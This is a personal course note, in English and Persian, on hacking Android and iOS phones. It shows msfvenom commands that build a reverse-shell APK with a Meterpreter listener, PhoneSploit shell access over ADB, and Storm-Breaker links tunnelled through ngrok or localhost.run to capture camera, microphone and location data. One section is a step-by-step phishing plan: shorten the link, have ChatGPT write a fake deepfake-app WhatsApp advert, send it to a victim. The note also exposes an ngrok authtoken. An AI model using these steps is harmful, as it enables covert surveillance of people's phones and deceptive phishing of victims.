---
Episode: E73 to E
Date: 2024-07-26
Is Finished?: true
Practice Primary: true
Practice Secondary: 
Time: 05:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E69 to E72 - (Web Hacking - Part 2)]]"
Next Episode: "[[E77 to E79(End) - (Solve Some CTF's on Try Hack Me)]]"
---
-------
## E73 to E76- (Android Hacking)
- [Installing Steps](#Installing%20Steps)
- [Hacking Android Phone using `Metasploit` - E74](#Hacking%20Android%20Phone%20using%20%60Metasploit%60%20-%20E74)
- [Definition & Instruction](#Definition%20&%20Instruction)
	- [Android Hacking Operationality](#Android%20Hacking%20Operationality)
	- [Android Hacking Instruction](#Android%20Hacking%20Instruction)
- [Practical Demo](#Practical%20Demo)
- [Hacking Android Phone Using `Phonesploit` over `ADB` - E75](#Hacking%20Android%20Phone%20Using%20%60Phonesploit%60%20over%20%60ADB%60%20-%20E75)
- [Definition & Instruction](#Definition%20&%20Instruction)
	- [What is Phonesploit Framework?](#What%20is%20Phonesploit%20Framework?)
	- [Download, Install & Using Phonesploit](#Download,%20Install%20&%20Using%20Phonesploit)
- [Practical Demo](#Practical%20Demo)
- [Hack Android & IOS Phones Using **Just 1 Click** - E76](#Hack%20Android%20&%20IOS%20Phones%20Using%20**Just%201%20Click**%20-%20E76)
- [Definition & Instruction](#Definition%20&%20Instruction)
	- [Basics & Concepts](#Basics%20&%20Concepts)
	- [Storm Breaker](#Storm%20Breaker)
		- [Whats Storm Breaker?](#Whats%20Storm%20Breaker?)
		- [Installing Storm Breaker](#Installing%20Storm%20Breaker)
		- [Usage of Storm Breaker](#Usage%20of%20Storm%20Breaker)
	- [localhost.run](#localhost.run)
		- [What is `localhost.run`?](#What%20is%20%60localhost.run%60?)
		- [Connect Local App to a Domain on Internet](#Connect%20Local%20App%20to%20a%20Domain%20on%20Internet)
	- [Ngrok](#Ngrok)
		- [What is Ngrok?](#What%20is%20Ngrok?)
		- [Download & Installation](#Download%20&%20Installation)
		- [Expose Storm Breaker to Ngrok](#Expose%20Storm%20Breaker%20to%20Ngrok)
- [Practical Demo](#Practical%20Demo)
	- [Hacking Using `Storm Breaker` & `localhost.run`](#Hacking%20Using%20%60Storm%20Breaker%60%20&%20%60localhost.run%60)
		- [Phase 1 - Expose Storm Breaker on Internet with `localhost.run`](#Phase%201%20-%20Expose%20Storm%20Breaker%20on%20Internet%20with%20%60localhost.run%60)
		- [Phase 2 - Social Engineering to Cleaning URL](#Phase%202%20-%20Social%20Engineering%20to%20Cleaning%20URL)
		- [Phase 3 - Wait for Click](#Phase%203%20-%20Wait%20for%20Click)
	- [Hacking Using `Storm Breaker` & `Ngrok`](#Hacking%20Using%20%60Storm%20Breaker%60%20&%20%60Ngrok%60)
******
### Install Android on VMWare - E73
#### Installing Steps
0. *Pre-Requires*:
	1. Install VMWare
	2. Download android image from https://www.android-x86.org/
		1. ![[Pasted image 20240724203056.png]]
1. *Create New Virtual Machine by below hardware*:
	1. *Hardware Compatibility*: Workstation 16.2x
		1. ![[Pasted image 20240724204815.png]]
	2. *Kernel:* Other Linux 4.x
		1. ![[Pasted image 20240724204843.png]]
	3. *Network:* NAT
	4. *I/O Controller type*: LSI Logic
		1. ![[Pasted image 20240724205004.png]]
	5. *Disk Type:* IDE
		1. ![[Pasted image 20240724205029.png]]
	6. Split Virtual Disk to Multiple files on *15Gb* Size
	7. `Customize Hardware => Display ` Checked `Accelerate 3D Graphics` 
		1. ![[Pasted image 20240724203655.png]]
	8. Finish & Close
2. *Power On Android VM-Machine*:
	1. `Boot Menu => Advanced Options => Auto Installation`
		1. ![[Pasted image 20240724205400.png]]
	2. `Advance Options => Auto Installation`
		1. ![[Pasted image 20240724205456.png]]
	3. Now Installing Start and Asked for Formatting Drive? Press `Y`
		1. ![[Pasted image 20240724205601.png]]
	4. After Installation Successfully finished, `Reboot` Android-X86 Machine
		1. ![[Pasted image 20240724205659.png]]
3. *After Reboot machine, Change Quiet Mode(CLI) to Normal Mode(GUI) in Grub Editor*:
	1. در منو بوت اولیه ماشین یکبار `e` را فشار میدهیم، سپس در منو بعدی برای انتخاب کرنل دوباره `e` را میفشاریم تا وارد صفحه ادیتور `Grub Editor` شویم. 
		1. ![[Pasted image 20240724204005.png]]
	2. متن اولیه به شکل زیر است که باید آنرا تغییر دهیم:
		1. ![[Pasted image 20240724205824.png]]
	3. برای تغییر متن، باید `quiet` را از متن پاک کنیم:
		1. ![[Pasted image 20240724205900.png]]
	4. و سپس کافیست عبارت روبرو را جایگزین آن کنیم => `nomodeset xforcevesa`
		1. `nomodeset xforcevesa`
			1. ![[Pasted image 20240724210000.png]]
	5. پس از تغییر متن هم کافیست از ادیتور Grub خارج شویم و سپس `B` را بفشاریم تا ماشین بوت شود.
		1. ![[Pasted image 20240724210316.png]]
	6. *نکته:* اینکار را باید در هر دفعه که ماشین اندرویدی را روشن میکنیم انجام دهیم و گرنه وارد محیط CLI اندروید میشویم. در کل تغییر `quiet` به `nomodeset xforcevesa` برای تغییر Quiet Mode(CLI) به حالت No Mode همان GUI است.
	7. تبریک ماشین اندرویدی با موفقیت بر روی VMWare نصب شد.
		1. ![[Pasted image 20240724204300.png]]
	8. *اسلاید*:
		1. ![[Pasted image 20240724204134.png]]
4. *Machine Booted for First Time*:
	1. در هنگام اولین بوت زمان بیشتری مصرف میشود.
	2. همچنین پس از اولین بوت باید کانفیگ های اولیه را بر روی ماشین اندرویدی پیاده سازی کنیم.
		1. ![[Pasted image 20240724210441.png]]
	3. بهتر است تمام سرویس های Location, Allow Scanning, Send Usage Data , ... را در ماشین اندرویدی غیر فعال کنیم.
	4. پس از چند ثانیه صفحه Home Android بالا می آید و میتوانیم با آن کار کنیم:
		1. ![[Pasted image 20240724210616.png]]
	5. همچنین با رفتن به Settings میتوانیم تمام تنظیمات را بر روی این ماشین انجام دهیم.
		1. ![[Pasted image 20240724210704.png]]
5. Installation Finished Successfully
### Hacking Android Phone using `Metasploit` - E74
#### Definition & Instruction
##### Android Hacking Description
در این جلسه میخواهیم یک APK Malicious ایجاد کنیم که پس از نصب آن بر روی ماشین تارگت یک Reverse Shell از ماشین تارگت در msfconsole دریافت کنیم.
	![[Pasted image 20240725193052.png]]
##### Android Hacking Instruction
1. Generate Payload using `msfvenom`
	1. Payload `android/meterpreter/reverse_tcp`
	2. LHOST=LOCALHOST-IP
	3. LPORT=LOCALHOST-PORT
	4. *Slide*
		1. ![[Pasted image 20240725193647.png]]
```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -f raw > android_shell.apk
```
	![[Pasted image 20240725193719.png]]
2. Open `multi/handler` Listener for Reverse Android Shell
```sh
sudo msfconsole
msf6> use exploit/multi/handler
msf6> set payload android/meterpreter/reverse_tcp
msf6> set LHOST 192.168.10.1
msf6> exploit
```
3. Now we should install APK Payload on Victim's Machine
	1. برای اینکار میتوانیم از روش های مهندسی اجتماعی استفاده کنیم. در واقع فقط کافیست فایل `apk` حاوی payload بر روی ماشین اندرویدی تارگت نصب شود:
		1. ![[Pasted image 20240725194027.png]]
	2. *مثلا میتوانیم از یک HTTP Server برای اشتراک فایل به ماشین اندرویدی استفاده کنیم >>*
		1. برای اینکار میتوانیم HTTP Server را بوسیله `python3` در فولدری که فایل Payload APK وجود دارد اجرا کنیم تا بتوانیم با اشتراک لینک فایل، آنرا در ماشین تارگت آپلود کنیم.
		2. `cd ~/PhoneSploit`
		3. `python3 -m http.server`
		4. `python3 -m http.server --bind 192.168.180.130 8000` If using NAT network in VM, You should bind IP to http server. 
			1. مخصوصا اگر از کارت شبکه NAT استفاده میکنیم باید آیپی و پورت سرور را مشخص کنیم.
		5. اینکار به این خاطر انجام میدهیم که بتوانیم فایل ها را براحتی به ماشین اندرویدی منتقل کنیم. در واقع با اینکار میتوانیم فایل را تبدیل به لینک کنیم و سپس لینک را برای تارگت بفرستیم.
	3. 
4. After payload installed on Victim's machine, you got `Meterpreter Shell` from Android machine on `msfconsole multi/handler` Listener
	1. ![[Pasted image 20240725194241.png]]
5. Hacking done, now you can run any Meterpreter Command on target machine.
#### Practical Demo
0. *Generate Android Payload with `msfvenom`*
	1. List all android payloads
		1. ![[Pasted image 20240725194512.png]]
	2. using `android/meterpreter/reverse_tcp`
	3. `LHOST` is Local IP of Kali
		1. ![[Pasted image 20240725194636.png]]
	4. `LPORT` is Local Port of `multi/handler Listener` 
```sh
msfvenom -l android | grep android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -f raw > file.apk
```
	![[Pasted image 20240725194811.png]]
1. *Start HTTP-Server to easy file Sharing to Android Device*
	1. `cd ~/PhoneSploit`
	2. `python3 -m http.server`
	3. اینکار به این خاطر انجام میدهیم که بتوانیم فایل ها را براحتی به ماشین اندرویدی منتقل کنیم. در واقع با اینکار میتوانیم فایل را تبدیل به لینک کنیم و سپس لینک را برای تارگت بفرستیم.
```sh
cd ~/PhoneSploit
python3 -m http.server
```
2. *Start Multi/Handler Listener*
	1. Same Payload we use in `msfvenom`
	2. `LHOST` is Local IP of Kali(same as IP using in `msfvenom`)
```sh
sudo msfconsole
msf6> use exploit/multi/handler
msf6> set payload android/meterpreter/reverse_tcp
msf6> set LHOST 192.168.10.1
msf6> run
```
	![[Pasted image 20240725195657.png]]
3. *Go to Android Phone on VM*
	1. Open Browser and goto http://KALI-LOCAL-IP:4444 => http://192.168.10.1:4444
	2. Now you can see all files in `home/kali/PhoneExploit` such `file.apk`, Download `file.apk`
		1. ![[Pasted image 20240725195953.png]]
	3. Open `file.apk` and `install` it.
		1. ![[Pasted image 20240725200057.png]]
4. After `file.apk` installed on Android-VM, you Get `Meterpreter Shell` Access in `msfconsole`
	1. ![[Pasted image 20240725200251.png]]
5. Android Phone Hacked Successfully.
### Hacking Android Phone Using `Phonesploit` over `ADB` - E75
#### Definition & Instruction
##### What is Phonesploit Framework?
- از فریم ورک Phonesploit برای نفوذ و گرفتن دسترسی به ماشین های اندرویدی استفاده میشود. 
- این ابزار بصورت پیشفرض با استفاده از ADB بر روی پورت 5555 به ماشین اندرویدی متصل میشود و میتواند کامندهای ADB را بر روی ماشین اندرویدی تارگت اجرا کند.
- بوسیله ADB ماشین های اندرویدی را میتوانیم هک کنیم که بر روی Developer Mode باشند و USB Debugging آنها هم فعال باشد.
- *اسلاید*:
	- ![[Pasted image 20240726161410.png]]
##### Download, Install & Using Phonesploit
- برای نصب فریم ورک باید ابتدا ADB را بر روی ماشین کالی نصب کنیم و سپس Phonesploit را از گیت Clone و سپس Install کنیم. همچنین ای ابزار به زبان پایتون توسعه داده شده است در نتیجه باید `python3, pip3` هم بر روی ماشین کالی نصب باشد.
```sh
sudo apt install adb python3 
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama "Or" python3 -m pip install colorama
Phonesploit.py
```
	![[Pasted image 20240726162307.png]]
- حال میتوانیم فریم ورک را روشن و اجرا کنیم:
```sh
python3 phonesploit.py
```
- برای استفاده از ابزار، کافیست آیپی ماشین اندرویدی را وارد کنیم تا نفوذ ما انجام شود و دسترسی برای ما فراهم شود. پس از وارد کردن آیپی تارگت، میتوانیم هر یک از اکشن هایی که در قسمت بالایی مشاهده میکنیم را بر روی تارگت اندروی اعمال کنیم:
```sh
[ + ] Enter a phone ip address.(type 99 to exit)
phonesploit(connect_phone) > 192.168.20.130
```
	![[Pasted image 20240726162815.png]]
#### Practical Demo
0. *Pre-Requires on Android-VM*
	1. Power ON Android `Menu => Dev Tools => Developer Options => Checked USB Debugging`
	2. `Android VM => Settings => Network & Internet => Wifi => Click connected Wifi => Wifi Gear(Settings) => Advanced` Copy IP Address of Android VM
		1. ![[Pasted image 20240726163237.png]]
1. *Pre-Requires on Kali-Linux*
	1. `sudo apt install adb`
	2. `git clone https://github.com/aerosol-can/PhoneSploit`
	3. `cd PhoneSploit`
	4. `python3 -m pip install colorama`
2. *Enumerating Android Phone*
	1. در مرحله اول باید بر روی تارگت Enumeration را انجام دهیم تا اطلاعاتی را برای نفوذ پیدا کنیم:
	2. `sudo nmap -sS -p- -Pn 192.168.20.132`
		1. ![[Pasted image 20240726163534.png]]
	3. در نتیجه اسکن پورت `tcp/5555` مربوط به `freeciv` باز Open است.
3. *Launching PhoneSploit  and Accessing to Android Target*
	1. حال میتوانیم فریم ورک را اجرا کنیم و حمله خود را شروع کنیم. کار با این فریم ورک بسیار ساده میباشد و فقط کافیست آیپی ماشین اندرویدی تارگت را برای نفوذ در ابزار وارد کنیم تا بهره برداری و نفوذ بصورت خودکار آغاز شود.
		1. ![[Pasted image 20240726165127.png]]
4. *Execute PhoneSploit Actions on Android Target*
	1. حال میتوانیم هر اکشن که در بالای صفحه مشاهده میکنیم را بر روی ماشین اندرویدی تارگت اعمال کنیم. لیست انواع اکشن ها را در تصویر زیر میتوانید مشاهده کنید:
		1. ![[Pasted image 20240726165938.png]]
	2. با فشردن `p` به صفحه دوم اکشن ها میرویم:
		1. ![[Pasted image 20240728000553.png]]
	3. *با وارد کردن `4` میتوانیم Shell Accessing را از گوشی اندروی تارگت دریافت کنیم >>*
		1. پس از دریافت Shell از تارگت اندرویدی میتوانیم تمام دستورات لینوکسی را نیز بر روی ماشین اندرویدی تارگت اجرا کنیم.
		2. `ls`
			1. ![[Pasted image 20240726165426.png]]
		3. `pwd`
		4. با دریافت دسترسی Shell میتوانیم فایل هایی که نیاز داریم را از گوشی اندروی تارگت دریافت کنیم. کافیست به دایرکتوری مورد نظر برویم و فایل مورد نظر را از ماشین Android بر روی ماشین Kali کپی کنیم.
		5. `cd Android/ ; ls`
			1. ![[Pasted image 20240726165640.png]]
	4. همچنین با وارد کردن `7` در Main Menu Phonesploit میتوانیم از صفحه ماشین تارگت Screenshot تهییه کنیم.
		1. ![[Pasted image 20240726170025.png]]
*****
```sh
"-------Installing------"
sudo apt install adb python3 
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama #Or 
python3 -m pip install colorama
"-------Usage------"
sudo nmap -sS -p- -Pn 192.168.20.132 #1. Enumerating Target
cd PhoneSploit
python3 phonesploit.py
"-------Framework Started------"
[ + ] Enter a phone ip address.(type 99 to exit)
phonesploit(connect_phone) > 192.168.20.130
phonesploit(main_menu) >
```
### Hack Android & IOS Phones Using **Just 1 Click** -  E76
#### Definition & Instruction
##### Basics & Concepts
در این حمله میخواهیم ابتدا یک URL مخرب ایجاد کنیم تا هنگامیکه کلاینت بر روی این URL کلیک کرد، کنترل Microphone, Camera & Location موبایل تارگت در دست Attacker قرار میگیرد. در واقع قربانی تنها با کلیک بر روی URL ساخته شده دسترسی گوشی خود را به Attacker میدهد.
	![[Pasted image 20240726170545.png]]
##### Storm Breaker 
###### Whats Storm Breaker?
- https://github.com/ultrasecurity/Storm-Breaker
0. برای ساخت URL که میتواند دسترسی را برای ما فراهم کند از ابزاری بنام `Storm Breaker` استفاده میکنیم که این ابزار میتواند >>
	1. Obtaining Device Information without any permissions
	2. Accessing Location
	3. Accessing Webcam 
	4. Accessing Microphone
		1. ![[Pasted image 20240726171230.png]]
1. همچنین پس نصب ابزار برای لاگین به پنل وب ابزار از Username و Password پیشفرض  `admin, admin` است:
	1. ![[Pasted image 20240726171450.png]]
2. برای استفاده از ابزار هم وابستگی ها Dependency های زیر نیاز است بر روی ماشین کلی نصب باشد >>
	1. `php, python3, git, Ngrok`
		1. ![[Pasted image 20240726171603.png]]
###### Installing Storm Breaker
3. برای نصب Storm Breaker نیز باید به شکل زیر عمل کنیم:
```sh
git clone https://github.com/ultrasecurity/Storm-Breaker
cd Storm-Breaker
sudo bash install.sh
sudo python3 -m pip install -r requirements.txt
sudo python3 st.py
```
	![[Pasted image 20240726171931.png]]
	![[Pasted image 20240726172131.png]]
4. پس از نصب ابزار برای استفاده میتوانیم به Web Panel ابزار برویم و سپس با یوزر `admin` و با پسورد `admin` به پنل لاگین کنیم.
	1. http://localhost:2525
		1. ![[Pasted image 20240726172336.png]]
###### Usage of Storm Breaker
- هنگامیکه به پنل Storm Breaker وارد میشویم چندین لینک را در صفحه میتوانیم مشاهده کنیم که هر کدام از این لینک ها دسترسی خاصی را برای ما فراهم میکند. 
- از نام لینک میتوانیم متوجه دسترسی که لینک فراهم میکند بشویم. مثلا لینک اول دسترسی `Camera` برای ما فراهم میکند و لینک دوم دسترسی `Microphone` را فراهم میکند:
	- ![[Pasted image 20240726172721.png]]
- بطور معمولی مثلا اگر لینک اول را در مرورگر باز کنیم، صفحه ای که در تصویر زیر مشاهده میکنید به کاربر نشان داده میشود، کافیست کاربر مکانی در صفحه را لمس یا کلیک کند و سپس در آن هنگام چندین عکس از دوربین گوشی اندرویدی تارگت گرفته میشود:
	- ![[Pasted image 20240726172903.png]]
- *نکته:* این لینک الان فقط در بستر شبکه داخلی LAN و پورت محلی 2525 کار میکند و اگر میخواهیم در بستر اینترنت از این لینک استفاده کنیم باید لینک را بوسیله ابزار هایی مانند `Ngrok` یا `localhost.run` در بستر اینترنت `Expose` کنیم.
##### localhost.run
###### What is `localhost.run`?
- https://localhost.run
- ابزار `localhost.run` یک ابزار Client-Less است که میتواند از یک برنامه Application در حال اجرا در ماشین لوکال یک نمونه Instance مشابه تهییه کند و سپس با استفاده از یک URL دسترسی به آن نمونه مشابه را از طریق اینترنت برای ما فراهم کند. 
- در واقع بوسیله localhost.run میتوانیم یک Application لوکال را در بستر اینترنت Expose کنیم و سپس بوسیله یک URL از آن استفاده کنیم. 
- در واقع ابزار localhost.run دسترسی به Application لوکال را از طریق برقراری یک ارتباط `SSH` میسر میکند.
- *اسلاید*:
	- ![[Pasted image 20240726181216.png]]
###### Connect Local App to a Domain on Internet
- برای اتصال یک برنامه لوکال که بر روی پورت 8080 کار میکند به یک دامنه در اینترنت با استفاده از `localhost.run` از کامند زیر استفاده میکنیم:
```sh
ssh -R 80:localhost:8080 localhost.run
-R => Reverse Tunnel
"if Local Application running on Port 3000" =>
ssh -R 80:localhost:3000 localhost.run
"For Exposing Storm Breaker" =>
ssh -R 80:localhost:2525 localhost.run
```
	![[Pasted image 20240726181350.png]]
##### Ngrok
###### What is Ngrok?
- https://ngrok.com
یکی دیگر از سرویس هایی که با استفاده از آن میتوانیم local application را در اینترنت Expose و استفاده کنیم، `Ngrok` است.
###### Download & Installation
1. Goto https://ngrok.com/Download and Download `Linux X86-64` Version
	1. ![[Pasted image 20240726190236.png]]
2. *Now Unzip downloaded file*
	1. `sudo tar xvzf ~/Downloads/ngrok -C /usr/local/bin`
		1. ![[Pasted image 20240726190415.png]]
	2. `ngrok -h` Check Installation
3. *Back to* https://ngrok.com *and copy Auth Token Command* 
	1. Signup/Login to your account.
	2. `Dashboard => Your Authtoken =>` Copy `ngrok config add-authtoken ....`  Command
		1. ![[Pasted image 20240726190802.png]]
4. *Add Auth Token to Kali Machine*
	1. Back to Kali Terminal and paste command to add Auth Token to local Machine.
		1. ![[Pasted image 20240726190841.png]]
	2. `ngrok config add-authtoken 2m2S2DWJw8BJ4wJko2qpX_4sBcLsFUrunhDAPappH8G`
###### Expose Storm Breaker to Ngrok
0. *Fire-UP Storm Breaker and Copy URL*
	1. `cd Storm-Breaker ; python3 st.py`
	2. http://localhost:2525
1. *Back to Terminal and Run following command to start expose*
	1. `ngrok http 2525`
		1. ![[Pasted image 20240726191230.png]]
	2. به محض اجرای دستور، پورت 2525/http ماشین لوکال از اینترنت در دسترس است. لینک این پورت Expose شده را میتوانیم در ترمینال در مقابل فیلد Forwarding مشاهده کنیم:
		1. ![[Pasted image 20240726191355.png]]
2. *Use Storm Breaker from Internet*
	3. حال کافیست URL را کپی کنیم و در مرورگر باز کنیم تا پنل Storm Breaker را با لینک های بروز شده که از اینترنت قابل دسترسی هستند را مشاهده کنیم.
#### Practical Demo
##### Hacking Using `Storm Breaker` & `localhost.run`
###### Phase 1 - Expose Storm Breaker on Internet with `localhost.run`
1. Generate SSH Key 
```sh
ssh-keygen -t rsa
"Leave Passphrase is Blank"
```
	![[Pasted image 20240726182135.png]]
2. *Established Reverse SSH Tunnel from `Storm-Breaker Webpanel` to `localhost.run`*
	1. با اجرای کامند تانل برعکس از پنل Storm Breaker به وب سرور localhost.run برقرار میشود.
	2. لینک ابزار Storm Breaker ما که در اینترنت Expose شده است را میتوانیم  پس از برقراری SSH در ترمینال مشاهده کنیم:
		1. ![[Pasted image 20240726182804.png]]
	3. همچنین QR-Code لینک را نیز در ترمینال مشاهده کنیم:
		1. ![[Pasted image 20240726182451.png]]
```sh
ssh -R 80:localhost:2525 localhost.run
```
	![[Pasted image 20240726182736.png]]
3. *Use Storm Breaker on Internet Web Panel*
	1. حال کافیست URL مورد نظر را کپی و سپس در مرورگر باز کنیم تا بتوانیم از Storm Breaker در بستر اینترنت استفاده کنیم. با یوزر و پسورد `admin` لاگین میکنیم.
		1. ![[Pasted image 20240726182929.png]]
	2. در پنل ادمین Storm Breaker لینک های بروز شده را مشاهده میکنیم که حال این لینک ها از بستر اینترنت هم قابل دسترسی هستند:
		1. ![[Pasted image 20240726183209.png]]
	3. برای تست میتوانیم لینک اول را کپی کنیم و سپس آنرا در مرورگر باز کنیم. در صفحه باز شده بر روی آیکون Shooting کلیک میکنیم و میبینیم که مرورگر میخواهد به Camera دسترسی بگیرد که این نشان دهنده صحت برنامه است:
		1. ![[Pasted image 20240726183355.png]]
	4. حال اگر هم به پنل مدیریت برگردیم، میتوانیم اطلاعات مرورگر که بر روی Shooting Icon در لینک Camera کلیک کرده است را مشاهده کنیم. این مرورگر میتواند قربانی همان ماشین اندرویدی ما باشد.
		1. ![[Pasted image 20240726183549.png]]
	5. همچنین path عکس هایی که از ماشین قربانی گرفته میشود را در پنل ادمین میتوان مشاهده کرد:
		1. ![[Pasted image 20240726183706.png]]
	6. این عکس در ماشین Kali در مسیر زیر در دسترس هستند >>
		1. `cd Storm-Breaker/storm-web/images`
			1. ![[Pasted image 20240726183919.png]]
###### Phase 2 - Social Engineering to Cleaning URL
- لینک معمولی URL ما مشکوک است و در مرحله بعدی باید با استفاده از شگرد هایی این لینک را بصورت سالم در بیاوریم تا شانس کلیک قربانی بر روی آن را بالا ببریم.
- بهترین روش برای اینکار استفاده از `URL Shortener` ها هستند که میتوانند لینک اصلی ما را خلاصه کند و در نتیجه URL کمی از حالت مشکوکی در می آید و شانس کلیک نیز بالا میرود.
1. *Short Camera Hacking URL with* https://t.ly
	1. Enter Attack url in field and click on `Shorten URL` 
	2. Then copy Shorten URL
		1. ![[Pasted image 20240726184534.png]]
- پس از خلاصه کردن URL باید کپشنی برای آن در نظر بگیریم و لینک را در زیر آن کپشن قرار دهیم تا شانس کلیک بر روی لینک زیاد شود. مثلا میتوانیم در قالب متنی که یک Application را معرفی و تبلیغ میکند لینک را جا دهیم.
2. *Goto `ChatGPT`*
	1. نمونه Prompt 1 >>
		1. یک پیام واتساپ را بنویس که یک Application تغییر چهره بوسیله هوش مصنوعی Deep Fake را انجام میدهد.
		2. Give me a WhatsApp message to announce an AI Based Deep fake generator tool
			1. ![[Pasted image 20240726185053.png]]
	2. حال کافیست جواب ChatGPT را کپی کنیم و سپس در آخر آن لینک خود را اضافه کنیم. در واقع ممتن تبلیغ ابزار Deep Fake AI است اما URL لینک هک دوربین گوشی اندروی تارگت است.
	3. با انجام این شگرد SE شانس کلیک بر روی لینک را بسیار بالا میبریم.
3. *Send Message to Victim's Phone*
	1. حال کافیست پیام تولید شده را برای قربانی در بستر SMS و یا WhatsApp و یا ... ارسال کنیم:
		1. ![[Pasted image 20240726185406.png]]
###### Phase 3 - Wait for Click
در فاز سوم حمله دیگر باید پنل وب Storm Breaker را باز کنیم و منتظر باشیم تا قربانی بر روی URL آلوده کلیک کند. 
1. *After First Click*
	1. مشخصات ماشین اندرویدی یا IOS تارگت را میتوانیم در قسمت پایی وب پنل مشاهده کنیم:
		1. ![[Pasted image 20240726185632.png]]
	2. همچنین به محض گرفتن تصویر از دوربین تارگت میتوانیم Notification آن را که حاوی Path آن عکس است را مشاهده کنیم:
		1. ![[Pasted image 20240726185735.png]]
	3. میتوانیم عکس مورد نظر را در مرورگر و یا در ماشین Kali باز و مشاهده کنیم.
2. Hacking Done
##### Hacking Using `Storm Breaker` & `Ngrok`
0. Fire-UP Storm Breaker and Copy URL
	1. http://localhost:2525
1. Back to Terminal and Run following command to start expose
```sh
ngrok http 2525
```
2. Copy Exposed URL, in front of Forwarding Field
	1. ![[Pasted image 20240726191616.png]]
3. Now goto https://t.ly and Shorten URL, then Copy that
	1. ![[Pasted image 20240726192038.png]]
4. Open sorted url in New Tab and Click on `Visit Site` to Open Storm Breaker Web Panel on Internet
	1. ![[Pasted image 20240726192135.png]]
	2. ![[Pasted image 20240726192149.png]]
5. Login with `admin, admin`, then` Copy First Link(Camera Hacking)` to send it to Victim.
	1. ![[Pasted image 20240726192257.png]]
6. Back again to https://t.ly and Shorted Camera Hacking URL again
	1. ![[Pasted image 20240726192344.png]]
7. Open Shorted url of Camera hacking in Browser, Click on `Visit Site` to Open Camera Hacking page
	1. ![[Pasted image 20240726192512.png]]
8. Click on `Shooting` Icon and then Click on `Allow` to Capturing Photo's from Target Camera
	1. ![[Pasted image 20240726192608.png]]
9. *In Storm Breaker Web Panel =>*
	1. We can see target Information
		1. ![[Pasted image 20240726192719.png]]
	2. We can See captured photo path
		1. ![[Pasted image 20240726192732.png]]

> [!NOTE]
> بنابراین در این جلسه توانستیم تنها با یک کلیک توسط کاربر دوربین، میکروفون و اطلاعات ماشین Android/IOS تارگت را بدست بیاوریم.

### !